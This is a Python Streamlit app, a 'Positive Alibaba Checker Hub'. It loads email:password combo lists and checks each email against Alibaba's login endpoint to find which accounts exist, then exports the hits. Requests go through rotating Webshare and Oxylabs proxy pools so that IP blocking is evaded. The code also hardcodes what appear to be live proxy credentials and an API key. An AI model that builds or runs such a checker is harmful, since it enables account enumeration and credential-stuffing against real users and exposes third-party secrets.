import streamlit as st
import asyncio
import os
import random
import uuid
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import threading
from datetime import datetime
from collections import defaultdict
import pandas as pd
import nest_asyncio

nest_asyncio.apply()

st.set_page_config(
    page_title="Positive Alibaba Checker Hub",
    page_icon="📦",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.title("📦 Positive Alibaba Checker Hub")
st.caption("Advanced automated Alibaba account existence checker powered by resilient session pools and deep verbose diagnostic telemetry.")

if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "checker_logs" not in st.session_state:
    st.session_state.checker_logs = []
if "startup_entries" not in st.session_state:
    st.session_state.startup_entries = []
if "alibaba_results" not in st.session_state:
    st.session_state.alibaba_results = {"linked": [], "not_linked": [], "errors": []}
if "pool_mode" not in st.session_state:
    st.session_state.pool_mode = "all"
if "pool_locked" not in st.session_state:
    st.session_state.pool_locked = True
if "picked_countries" not in st.session_state:
    st.session_state.picked_countries = ["US"]
if "pool_pick" not in st.session_state:
    st.session_state.pool_pick = None

def log_startup(msg):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
    if entry not in st.session_state.startup_entries:
        st.session_state.startup_entries.append(entry)

log_startup("Alibaba Checker Hub initialized with deep verbose diagnostic telemetry engine v2.10.")

def add_proxy_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.proxy_logs.append(entry)

def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in st.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

def get_secrets_webshare_keys():
    if "WEBSHARE_KEYS" in st.secrets:
        raw = st.secrets["WEBSHARE_KEYS"]
        return [k.strip() for k in raw.strip().splitlines() if k.strip()]
    return ["ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo"]

def get_secrets_oxylabs_proxies():
    if "OXYLABS_BASE" in st.secrets:
        raw = st.secrets["OXYLABS_BASE"]
        return [p.strip() for p in raw.strip().splitlines() if p.strip()]
    return ["user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000"]

webshare_keys_env = get_secrets_webshare_keys()
oxylabs_proxies_env = get_secrets_oxylabs_proxies()

proxy_meta_file = "proxy_meta.json"
def load_proxy_meta():
    if os.path.exists(proxy_meta_file):
        try:
            with open(proxy_meta_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

proxy_meta = load_proxy_meta()
proxy_lock = threading.Lock()
file_write_lock = threading.Lock()

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(proxy_meta_file, "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Failed to save proxy meta: {e}")

def load_proxies():
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file) or os.path.getsize(proxy_file) == 0:
        default_seed = oxylabs_proxies_env[:]
        try:
            with file_write_lock:
                with open(proxy_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(default_seed) + "\n")
        except Exception:
            pass
    try:
        with open(proxy_file, encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return raw_list if raw_list else oxylabs_proxies_env
    except Exception:
        return oxylabs_proxies_env

def parse_proxy(proxy_str):
    proxy_str = (proxy_str or "").strip()
    if not proxy_str:
        return None
    proxy_str = proxy_str.replace("http://", "").replace("https://", "").strip()
    if "@" in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{proxy_str}"
    return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        total = success_count + fail_count
        if total == 0:
            return initial_latency_score
        smoothed_success = success_count + 2
        smoothed_fail = fail_count + 1
        smoothed_total = smoothed_success + smoothed_fail
        success_rate = (smoothed_success / smoothed_total) * 100
        score = int(success_rate - (fail_count * 5))
        return max(0, min(100, score))
    except Exception:
        return initial_latency_score

def get_geo(proxy_str):
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return "-", "-"
    try:
        r = requests.get("http://ip-api.com/json/", proxies={"http": proxy, "https": proxy}, timeout=5)
        data = r.json()
        return data.get("country", "-"), data.get("city", "-")
    except Exception:
        return "-", "-"

def test_proxy(proxy_str, timeout_sec=3):
    try:
        proxy = parse_proxy(proxy_str)
        if not proxy:
            return False, "Invalid proxy format", "Unknown", 0
        start_t = time.time()
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy, "https": proxy}, timeout=timeout_sec)
        latency = int((time.time() - start_t) * 1000)
        if r.status_code == 200:
            initial_score = max(0, min(100, 100 - int(latency / 15)))
            country, city = get_geo(proxy_str)
            with proxy_lock:
                if proxy_str not in proxy_meta:
                    proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": city, "latency_ms": latency}
                m = proxy_meta[proxy_str]
                m["success"] = m.get("success", 0) + 1
                m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_score)
                m["country"] = country
                m["region"] = city
                m["latency_ms"] = latency
            save_proxy_meta()
            return True, f"OK ({latency}ms)", country, proxy_meta[proxy_str]["score"]
        return False, f"HTTP Status {r.status_code}", "Unknown", 0
    except requests.exceptions.Timeout:
        return False, "Connection Timeout", "Unknown", 0
    except Exception as e:
        return False, str(e)[:30], "Unknown", 0

def load_webshare(api_keys):
    info, out = {}, []
    for api_key in api_keys:
        if not api_key.strip():
            continue
        try:
            headers = {"Authorization": f"Token {api_key.strip()}"}
            page = 1
            while page <= 10:
                url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
                r = requests.get(url, headers=headers, timeout=15)
                if r.status_code != 200:
                    break
                data = r.json()
                items = data.get("results", [])
                if not items:
                    break
                for it in items:
                    try:
                        line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                        out.append(line)
                        info[line] = (str(it.get("country_code") or "-"), str(it.get("city_name") or "-"))
                    except Exception:
                        continue
                if not data.get("next"):
                    break
                page += 1
        except Exception as e:
            add_proxy_log(f"Error fetching Webshare API key: {str(e)[:50]}")
            continue
    return list(dict.fromkeys(out)), info

def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = meta.get("country", "Unknown").upper()
            score = meta.get("score", 50)
            country_scores[c].append(score)
        avg_country_scores = [(c, sum(s)/len(s)) for c, s in country_scores.items() if c != "UNKNOWN"]
        avg_country_scores.sort(key=lambda x: x[1], reverse=True)
        return [item[0] for item in avg_country_scores] + ["US"]
    except Exception:
        return ["US", "GB", "DE"]

def get_filtered_active_proxies():
    raw = load_proxies()
    filtered = []
    min_score = st.session_state.get("min_proxy_score", 40)
    mode = st.session_state.get("pool_mode", "all")
    chosen = st.session_state.get("picked_countries", ["US"])
    
    for p in raw:
        meta = proxy_meta.get(p, {})
        score = meta.get("score", 50)
        country = meta.get("country", "Unknown").upper()
        if score < min_score:
            continue
        if mode == "all":
            filtered.append(p)
        elif mode == "us_only":
            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
                filtered.append(p)
        elif mode in ("country", "mix"):
            if any(cc in country or cc in p.upper() for cc in chosen):
                filtered.append(p)
        else:
            filtered.append(p)
    return filtered if filtered else raw

st.sidebar.header("⚙️ Configuration Hub")
st.sidebar.markdown("### 🌐 Proxy Management & Health")
all_proxies_loaded = load_proxies()
filtered_proxy_pool = get_filtered_active_proxies()
st.sidebar.info(f"Loaded Proxies: {len(all_proxies_loaded)} | Filtered Pool: {len(filtered_proxy_pool)}")

min_proxy_score = st.sidebar.slider("Min Proxy Score", 0, 100, 40, key="min_proxy_score")
proxy_timeout = st.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 3, key="proxy_timeout")

pool_mode = st.session_state.pool_mode
if st.session_state.pool_locked:
    st.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        st.sidebar.caption("Picked: " + ", ".join(st.session_state.picked_countries))
    if st.sidebar.button("Change pool"):
        st.session_state.pool_locked = False
        st.session_state.pool_pick = None
        st.rerun()
else:
    st.sidebar.caption("Tap pool mode:")
    col_p1, col_p2 = st.sidebar.columns(2)
    with col_p1:
        if st.sidebar.button("all", key="pool_btn_all"):
            st.session_state.pool_mode = "all"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("country", key="pool_btn_country"):
            st.session_state.pool_pick = "country"
            st.rerun()
    with col_p2:
        if st.sidebar.button("us_only", key="pool_btn_us"):
            st.session_state.pool_mode = "us_only"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("mix", key="pool_btn_mix"):
            st.session_state.pool_pick = "mix"
            st.rerun()
            
    choice = st.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores()
        with st.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                if st.checkbox(c, value=c in st.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if st.form_submit_button("Done"):
                if picked:
                    st.session_state.pool_mode = choice
                    st.session_state.picked_countries = picked
                    st.session_state.pool_locked = True
                    st.session_state.pool_pick = None
                    st.rerun()

with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
    custom_proxy_text = st.text_area("Paste proxies (user:pass@ip:port)", height=80)
    if st.button("Save Custom Proxies"):
        if custom_proxy_text.strip():
            new_p = [l.strip() for l in custom_proxy_text.splitlines() if l.strip()]
            existing = load_proxies()
            combined = list(dict.fromkeys(existing + new_p))
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(combined) + "\n")
            st.success(f"Added {len(new_p)} custom proxies!")
            st.rerun()

if st.sidebar.button("📥 Fetch & Test All Proxies"):
    st.session_state.proxy_logs = []
    with st.spinner("Fetching Webshare proxies & testing pool health..."):
        ws_list, api_info = load_webshare(webshare_keys_env)
        all_raw = list(dict.fromkeys(oxylabs_proxies_env + ws_list))
        live = []
        for idx, p in enumerate(all_raw, 1):
            short = p.split("@")[-1] if "@" in p else p
            is_alive, msg, country, score = test_proxy(p, timeout_sec=proxy_timeout)
            if is_alive:
                live.append(p)
                add_proxy_log(f"[{idx}/{len(all_raw)}] ✅ Alive → {short} | Country: {country} | Score: {score} | {msg}")
            else:
                add_proxy_log(f"[{idx}/{len(all_raw)}] ❌ Dead → {short} | Reason: {msg}")
        with file_write_lock:
            with open("proxies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(live))
        st.success(f"Proxy test complete! Saved {len(live)} live proxies.")

max_workers = st.sidebar.slider("Worker Threads", 1, 10, 3)

st.sidebar.markdown("---")
st.sidebar.header("📋 Accounts Input")
accounts_input = st.sidebar.text_area(
    "Paste accounts (email:password)",
    value="example1@domain.com:password123\nexample2@domain.com:password456",
    height=120
)

st.markdown("---")
st.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
startup_expander = st.expander("🔍 View All Startup Entries", expanded=True)
with startup_expander:
    st.code("\n".join(st.session_state.startup_entries), language="text")

tab1, tab2, tab3 = st.tabs(["🌐 Proxy Manager", "🚀 Alibaba Checker", "📁 Results & Export"])

with tab1:
    st.subheader("Proxy Management & Health")
    if st.session_state.proxy_logs:
        st.code("\n".join(st.session_state.proxy_logs), language="text")
    else:
        st.info("Click 'Fetch & Test All Proxies' in the sidebar.")

with tab2:
    st.subheader("Alibaba Account Existence Checker Engine")
    accounts = [l.strip() for l in accounts_input.strip().splitlines() if l.strip() and ":" in l]
    st.info(f"Loaded **{len(accounts)}** valid account combos ready for checking.")

    if st.button("🚀 Start Alibaba Checker", type="primary"):
        if not accounts:
            st.warning("Please provide accounts in the sidebar first.")
        else:
            timestamp_init = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            local_logs = [f"[{timestamp_init}] [INIT] Initializing HTTP Alibaba Checker engine v2.10 with {len(accounts)} accounts across {max_workers} worker threads."]

            proxy_file = "proxies.txt"
            alive_proxies = []
            if os.path.exists(proxy_file):
                with open(proxy_file, encoding="utf-8") as f:
                    alive_proxies = [l.strip() for l in f if l.strip()]
            if not alive_proxies:
                alive_proxies = oxylabs_proxies_env

            linked_accs, not_linked_accs, error_accs = [], [], []
            proxy_state = [0]
            lock = threading.Lock()

            OXY_USER = "user-Positive_S79mq-country-US"
            OXY_PASS = "Kingfrosh5252+"
            OXY_HOST = "dc.oxylabs.io:8000"

            def make_oxylabs_proxy():
                return f"{OXY_USER}-sessid-{uuid.uuid4().hex[:12]}:{OXY_PASS}@{OXY_HOST}"

            def get_next_proxy():
                if not alive_proxies:
                    return None
                with lock:
                    p = alive_proxies[proxy_state[0] % len(alive_proxies)]
                    proxy_state[0] += 1
                if "oxylabs.io" in p:
                    p = make_oxylabs_proxy()
                cleaned = p.replace("http://", "").replace("https://", "").strip()
                formatted = f"http://{cleaned}"
                return {"http": formatted, "https": formatted}

            def classify(text):
                text = text or ""
                lowered = text.lower()
                if "account does not exist" in lowered or "not exist" in lowered or "invalid email" in lowered:
                    return "not_linked", "Account does not exist (Matched pattern)"
                if "captcha" in lowered or "blocked" in lowered or "forbidden" in lowered:
                    return "error", "Blocked by WAF / Captcha"
                return "linked", "Account exists / Linked (Default fallback)"

            def check_single_account(args):
                idx, line = args
                email = line.split(":", 1)[0].strip()
                ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                
                # Thread-local persistent session with retry adapters
                session = requests.Session()
                retries = Retry(total=1, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
                session.mount("https://", HTTPAdapter(max_retries=retries))
                session.mount("http://", HTTPAdapter(max_retries=retries))

                for attempt in range(3):
                    # Attempt 2 is a direct fallback connection
                    if attempt == 2:
                        proxies = None
                        proxy_host_display = "DIRECT (No Proxy Fallback)"
                    else:
                        proxies = get_next_proxy()
                        proxy_host_display = proxies['http'].split('@')[-1] if proxies else "DIRECT"

                    headers = {
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Referer": "https://login.alibaba.com/"
                    }
                    try:
                        url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
                        
                        start_req = time.time()
                        r = session.get(url, headers=headers, proxies=proxies, timeout=10)
                        elapsed = int((time.time() - start_req) * 1000)
                        
                        snippet = r.text.replace("\n", " ")[:120]
                        
                        if r.status_code == 200:
                            status, detail = classify(r.text)
                            icon = "✅" if status == "linked" else "❌"
                            log_msg = (
                                f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | "
                                f"Proxy/Route: {proxy_host_display} | URL: {url} | "
                                f"HTTP 200 ({elapsed}ms) | Status: {icon} {status.upper()} | "
                                f"Detail: {detail} | Len: {len(r.text)} | Snippet: [{snippet}]"
                            )
                            return status, line, log_msg
                        else:
                            if attempt == 2:
                                log_msg = f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | Route: {proxy_host_display} | Status: ⚠️ ERROR | HTTP Status {r.status_code}"
                                return "error", f"{line} # HTTP Status {r.status_code}", log_msg
                    except Exception as e:
                        if attempt == 2:
                            err_msg = str(e)[:50]
                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | Route: {proxy_host_display} | Status: ⚠️ ERROR | Exception: {err_msg}"
                            return "error", f"{line} # {err_msg}", log_msg
                return "error", f"{line} # Max retries & direct fallback failed", f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Max retries and direct fallback exhausted"

            with st.spinner("Checking accounts via resilient HTTP proxy workers and direct fallback..."):
                from concurrent.futures import ThreadPoolExecutor, as_completed
                tasks = [(idx, line) for idx, line in enumerate(accounts, 1)]
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(check_single_account, task): task for task in tasks}
                    for future in as_completed(futures):
                        try:
                            status, item_data, log_msg = future.result()
                            local_logs.append(log_msg)
                            if status == "linked":
                                linked_accs.append(item_data)
                            elif status == "not_linked":
                                not_linked_accs.append(item_data)
                            else:
                                error_accs.append(item_data)
                        except Exception as ex:
                            local_logs.append(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] Worker Exception: {str(ex)}")
                            error_accs.append(str(ex))

            st.session_state.checker_logs = local_logs
            st.session_state.alibaba_results = {
                "linked": linked_accs,
                "not_linked": not_linked_accs,
                "errors": error_accs
            }
            st.success("Checker execution complete!")

    res = st.session_state.alibaba_results
    m1, m2, m3 = st.columns(3)
    m1.metric("✅ Linked Accounts", len(res["linked"]))
    m2.metric("❌ Not Linked", len(res["not_linked"]))
    m3.metric("⚠️ Errors", len(res["errors"]))

    with st.expander("🔍 Diagnostic Telemetry Logs", expanded=True):
        if st.session_state.checker_logs:
            st.code("\n".join(st.session_state.checker_logs), language="text")
        else:
            st.caption("Logs will appear here during execution.")

with tab3:
    st.subheader("Export Results")
    res = st.session_state.alibaba_results
    if res["linked"]:
        st.markdown("### Linked Accounts")
        st.code("\n".join(res["linked"]), language="text")
        st.download_button("Download Linked TXT", "\n".join(res["linked"]), file_name="linked_accounts.txt", mime="text/plain")
    if res["not_linked"]:
        st.markdown("### Not Linked Accounts")
        st.code("\n".join(res["not_linked"]), language="text")
        st.download_button("Download Not Linked TXT", "\n".join(res["not_linked"]), file_name="not_linked_accounts.txt", mime="text/plain")
    if res["errors"]:
        st.markdown("### Errors")
        st.code("\n".join(res["errors"]), language="text")
        st.download_button("Download Errors TXT", "\n".join(res["errors"]), file_name="error_accounts.txt", mime="text/plain")
